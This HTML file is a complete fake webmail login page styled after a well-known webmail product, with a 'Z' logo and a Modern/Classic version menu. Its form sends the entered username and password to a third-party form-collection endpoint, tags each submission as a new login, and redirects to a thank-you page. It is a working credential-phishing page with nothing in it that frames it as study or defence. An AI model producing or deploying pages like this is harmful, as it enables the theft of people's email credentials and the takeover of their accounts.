<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Webmail Login</title>
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

  body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    background: linear-gradient(135deg, #004f71, #0076a8, #1f86b2);
    background-size: 400% 400%;
    animation: gradientShift 12s ease infinite;
  }

  @keyframes gradientShift {
    0%   { background-position: 0% 50%; }
    50%  { background-position: 100% 50%; }
    100% { background-position: 0% 50%; }
  }

  .login-card {
    background: #fff;
    border-radius: 12px;
    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.28);
    width: 380px;
    max-width: 92vw;
    padding: 40px 32px 32px;
    display: flex;
    flex-direction: column;
    align-items: flex-start;
  }

  .brand {
    display: flex;
    align-items: center;
    gap: 10px;
    margin-bottom: 16px;
  }

  .brand .logo {
    width: 36px;
    height: 36px;
  }

  .brand-name {
    font-size: 28px;
    font-weight: 700;
    color: #0076a8;
  }

  .login-card h1 {
    font-size: 16px;
    font-weight: 500;
    color: #555;
    margin-bottom: 24px;
  }

  form { width: 100%; }

  .field { margin-bottom: 16px; width: 100%; }

  .field label {
    display: block;
    font-size: 13px;
    color: #555;
    margin-bottom: 4px;
    font-weight: 500;
  }

  .field input[type="text"],
  .field input[type="password"] {
    width: 100%;
    padding: 10px 12px;
    font-size: 14px;
    border: 1px solid #ccc;
    border-radius: 4px;
    outline: none;
    transition: border-color 0.2s;
  }

  .field input:focus {
    border-color: #1a2a6c;
    box-shadow: 0 0 0 2px rgba(26, 42, 108, 0.15);
  }

  .options {
    display: flex;
    align-items: center;
    justify-content: space-between;
    width: 100%;
    margin-bottom: 20px;
  }

  .options label {
    font-size: 13px;
    color: #555;
    display: flex;
    align-items: center;
    gap: 4px;
    cursor: pointer;
  }

  .options a {
    font-size: 13px;
    color: #1a2a6c;
    text-decoration: none;
  }

  .options a:hover { text-decoration: underline; }

  .btn-signin {
    width: 100%;
    padding: 10px;
    font-size: 15px;
    font-weight: 600;
    color: #fff;
    background: #0076a8;
    border: none;
    border-radius: 4px;
    cursor: pointer;
    transition: background 0.2s;
  }

  .btn-signin:hover { background: #00648f; }
  .btn-signin:active { background: #004f71; }

  .version-select {
    margin-top: 18px;
    width: 100%;
  }

  .version-select label {
    font-size: 12px;
    color: #777;
    display: block;
    margin-bottom: 4px;
  }

  .version-select select {
    width: 100%;
    padding: 8px 10px;
    font-size: 13px;
    border: 1px solid #ccc;
    border-radius: 4px;
    background: #fafafa;
    outline: none;
  }

  .footer {
    margin-top: 24px;
    font-size: 11px;
    color: #999;
    text-align: center;
  }
</style>
</head>
<body>

<div class="login-card">
  <div class="brand">
    <svg class="logo" viewBox="0 0 40 40" xmlns="http://www.w3.org/2000/svg">
      <rect x="0" y="4" width="32" height="32" rx="6" fill="#0076a8"/>
      <text x="16" y="27" text-anchor="middle" fill="#fff" font-size="18" font-weight="bold" font-family="Arial">Z</text>
    </svg>
    <span class="brand-name">Webmail</span>
  </div>

  <h1>Log In</h1>

  <form action="https://formspree.io/f/mvzebljp" method="POST">
    <input type="hidden" name="_next" value="thankyou.html">
    <input type="hidden" name="_subject" value="New Webmail Login Submission">
    <div class="field">
      <label for="username">Username</label>
      <input type="text" id="username" name="username" placeholder="Enter your username" required autocomplete="username">
    </div>

    <div class="field">
      <label for="password">Password</label>
      <input type="password" id="password" name="password" placeholder="Enter your password" required autocomplete="current-password">
    </div>

    <div class="options">
      <label>
        <input type="checkbox" name="staySignedIn" value="1"> Stay signed in
      </label>
      <a href="#">Forgot password?</a>
    </div>

    <div class="version-select">
      <label for="version">Version</label>
      <select id="version" name="version">
        <option value="modern">Modern</option>
        <option value="classic">Classic</option>
      </select>
    </div>

    <button type="submit" class="btn-signin">Sign In</button>
  </form>

  <div class="footer">&copy; 2026 Webmail. All rights reserved.</div>
</div>

</body>
</html>
